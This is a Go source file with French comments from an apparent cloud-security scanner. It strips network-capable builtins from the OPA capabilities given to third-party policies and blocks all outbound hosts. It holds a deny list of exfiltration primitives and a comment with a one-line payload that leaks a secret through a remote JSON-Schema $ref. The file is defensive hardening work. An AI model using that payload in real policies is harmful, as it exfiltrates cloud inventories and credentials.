package engine

import (
	"sync"

	"github.com/open-policy-agent/opa/v1/ast"
)

// deniedBuiltins : primitives retirées des capacités offertes aux politiques.
//
// Une politique est du CODE fourni par un tiers — pepin la charge à chaud via
// --policy-dir, sans recompilation. Lui laisser une primitive réseau revient à
// offrir à ce code l'exfiltration de l'input évalué (inventaire cloud complet :
// user-data, documents de politique IAM, policies de bucket) et le balayage du
// réseau interne depuis l'intérieur du scanner, credentials du runner à portée.
//
// Aucune règle de posture n'a de raison légitime d'émettre une requête : une
// règle décide à partir de l'input qu'on lui donne. Le retrait est donc sans
// perte fonctionnelle, et c'est ce que TestOrdinaryBuiltinsStillWork vérifie.
var deniedBuiltins = map[string]struct{}{
	"http.send":          {}, // requête HTTP arbitraire : exfiltration et SSRF
	"net.lookup_ip_addr": {}, // résolution DNS : exfiltration par requête DNS
	"opa.runtime":        {}, // expose l'environnement du processus hôte
}

var (
	restrictedOnce sync.Once
	restrictedCaps *ast.Capabilities
)

// restrictedCapabilities retourne les capacités de la version d'OPA compilée,
// privées des primitives de deniedBuiltins. Le résultat est calculé une fois et
// partagé : ast.Capabilities est traité en lecture seule par le compilateur.
func restrictedCapabilities() *ast.Capabilities {
	restrictedOnce.Do(func() {
		caps := ast.CapabilitiesForThisVersion()
		// On RECONSTRUIT le slice au lieu de filtrer en place : caps.Builtins peut
		// partager son tableau sous-jacent avec la liste globale des builtins d'OPA,
		// qu'une suppression en place corromprait pour tout le processus.
		kept := make([]*ast.Builtin, 0, len(caps.Builtins))
		for _, b := range caps.Builtins {
			if _, denied := deniedBuiltins[b.Name]; denied {
				continue
			}
			kept = append(kept, b)
		}
		caps.Builtins = kept
		// AllowNet vide (non nil) = AUCUN hôte joignable. Retirer les primitives
		// réseau ne suffit pas : OPA résout les `$ref` distants d'un JSON-Schema en
		// HTTP au moment de l'ÉVALUATION, si bien qu'une politique chargée à chaud
		// exfiltre encore l'input via json.match_schema / json.verify_schema :
		//
		//   json.match_schema(input, {"$ref": sprintf("%s/leak/%s", [url, input.secret])})
		//
		// Mesuré sur v0.2.2 : le serveur témoin reçoit /leak/EXFIL-TOKEN, sans erreur
		// remontée à l'appelant. `AllowNet: nil` (le défaut de
		// CapabilitiesForThisVersion) signifie « tous les hôtes ». Le champ n'est
		// honoré par le chargeur de schémas qu'à partir d'OPA 1.20 : c'est la raison
		// du bump qui accompagne ce correctif.
		caps.AllowNet = []string{}
		restrictedCaps = caps
	})
	return restrictedCaps
}
